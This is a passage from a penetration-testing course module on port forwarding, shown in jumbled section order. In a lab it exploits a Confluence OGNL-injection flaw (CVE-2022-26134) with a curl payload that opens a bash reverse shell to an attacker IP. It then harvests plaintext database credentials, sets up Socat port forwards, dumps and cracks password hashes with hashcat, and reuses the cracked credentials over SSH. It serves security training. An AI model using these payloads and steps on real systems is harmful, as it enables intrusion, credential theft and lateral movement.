While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

